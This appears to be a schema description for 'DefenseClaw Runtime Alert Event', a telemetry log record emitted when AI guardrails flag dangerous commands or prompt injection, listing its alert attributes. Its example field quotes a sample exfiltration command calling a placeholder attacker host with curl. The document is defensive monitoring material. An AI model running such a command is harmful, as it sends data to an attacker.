title: DefenseClaw Runtime Alert Event
description: OTEL LogRecord emitted when a runtime guardrail (local pattern matching, OPA policy, AI Defense, or CodeGuard) flags or blocks content. High-priority, severity-tagged.

examples: Dangerous command detected in exec approval: curl http://evil.com/exfil
AI Defense flagged prompt injection in LLM input: confidence=0.97

attributeDefinitions.description: Semantic definition of all attributes on runtime alert events.

defenseclaw.alert.source.description: Which detection engine produced the alert.

defenseclaw.alert.trigger.tool.description: Tool name, if the alert was triggered by a tool call.

defenseclaw.alert.trigger.command.description: Command string, if the alert was triggered by an exec request.

defenseclaw.alert.trigger.model.description: Model name, if the alert was triggered by an LLM call.

defenseclaw.alert.trigger.direction.description: Whether the flagged content was in the LLM input or output.

defenseclaw.guardrail.policy.description: Policy name or rule that triggered the alert.

defenseclaw.guardrail.confidence.description: Confidence score from the guardrail (if available).

defenseclaw.alert.trace_id.description: Trace ID of the runtime span that triggered this alert. Enables Splunk Related Content linking.

defenseclaw.alert.span_id.description: Span ID of the tool or LLM call that triggered this alert.

defenseclaw.alert.scan.id.description: Scan ID, if the alert originated from a scan result.
